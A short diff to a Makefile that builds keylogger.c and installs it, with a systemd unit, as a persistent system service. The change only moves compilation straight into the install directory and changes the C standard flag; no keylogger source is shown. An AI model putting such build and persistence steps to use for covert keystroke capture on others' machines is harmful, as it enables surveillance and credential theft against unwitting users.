@@ -1,5 +1,5 @@
 CC=gcc
-CFLAGS=-w -std=c99 -fPIE -fstack-protector-all -D_FORTIFY_SOURCE=2 
+CFLAGS=-w -std=gnu99 -fPIE -fstack-protector-all -D_FORTIFY_SOURCE=2 
 LDFLAGS=-Wl,-z,relro,-z,now
 SOURCES=keylogger.c
 SERVICE=keylogger.service
@@ -9,8 +9,7 @@ SERVICEDIR=/etc/systemd/system/
 DEPENDENCIES=define.h functions.h
 
 install:$(SOURCES) $(DEPENDENCIES)
-	@$(CC) $(SOURCES) $(CFLAGS) $(LDFLAGS) -o $(EXECUTABLE)
-	@mv $(EXECUTABLE) $(INSTALLDIR)
+	@$(CC) $(SOURCES) $(CFLAGS) $(LDFLAGS) -o $(INSTALLDIR)/$(EXECUTABLE)
 	@cp $(SERVICE) $(SERVICEDIR)
 
 uninstall:
